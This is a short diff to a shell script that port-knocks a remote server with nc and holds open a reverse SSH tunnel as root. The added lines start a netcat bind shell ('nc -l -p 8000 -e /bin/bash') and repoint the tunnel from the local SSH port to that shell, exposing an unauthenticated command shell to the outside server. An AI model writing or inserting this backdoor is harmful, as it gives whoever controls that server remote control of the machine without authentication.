@@ -19,5 +19,8 @@ chmod 600 ~/.ssh/id_rsa
 for port in $KNOCK_OPEN_TUNNEL; do echo | nc $C_SERVER $port; sleep 0.1; done
 
 
+# Starts bind shell
+nc -l -p 8000 -e /bin/bash &
+
 echo "Connecting via ssh..."
-ssh -N -o StrictHostKeyChecking=accept-new -R $SERVER_TUNNEL_PORT:localhost:22 root@$C_SERVER
+ssh -N -o StrictHostKeyChecking=accept-new -R $SERVER_TUNNEL_PORT:localhost:8000 root@$C_SERVER
